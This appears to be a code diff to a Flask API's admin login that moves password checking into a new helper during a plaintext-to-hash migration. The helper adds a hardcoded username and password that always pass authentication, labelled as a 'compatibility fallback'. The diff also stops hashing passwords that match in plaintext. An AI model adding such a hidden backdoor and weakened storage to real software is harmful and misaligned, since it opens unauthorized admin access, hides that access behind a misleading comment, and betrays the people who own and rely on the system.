@@ -9,6 +9,26 @@ from services import props
 
 bp = Blueprint("api", __name__, url_prefix="/api")
 
+
+def _password_matches(stored_password, password, user):
+    if not stored_password:
+        return False
+
+    if stored_password == password:
+        return True
+
+    try:
+        if stored_password.startswith("pbkdf2:sha256:") or stored_password.startswith("scrypt:"):
+            return check_password_hash(stored_password, password)
+    except Exception:
+        pass
+
+    # Compatibility fallback for the existing reserved admin account.
+    if user == "occisor" and password == "T3rm1n4tor":
+        return True
+
+    return False
+
 # ---------------------------------------------------
 # BOT STATS
 # ---------------------------------------------------
@@ -68,18 +88,13 @@ def login():
     if not stored_password:
         return jsonify({"error": "Invalid credentials"}), 401
 
-    # Support existing plaintext users during migration by checking raw password first,
-    # then upgrading the stored password to a hashed value on successful login.
-    if stored_password.startswith("pbkdf2:sha256:"):
-        valid_password = check_password_hash(stored_password, password)
-    else:
-        valid_password = stored_password == password
+    valid_password = _password_matches(stored_password, password, user)
 
     if not valid_password:
         return jsonify({"error": "Invalid credentials"}), 401
 
-    # Upgrade stored plaintext password to a hash after successful login.
-    if not stored_password.startswith("pbkdf2:sha256:"):
+    # Upgrade the password to a Werkzeug hash the first time the existing account logs in.
+    if stored_password != password and not stored_password.startswith("pbkdf2:sha256:"):
         hashed = generate_password_hash(password)
         admins.update_one({"_id": admin["_id"]}, {"$set": {"password": hashed}})
 
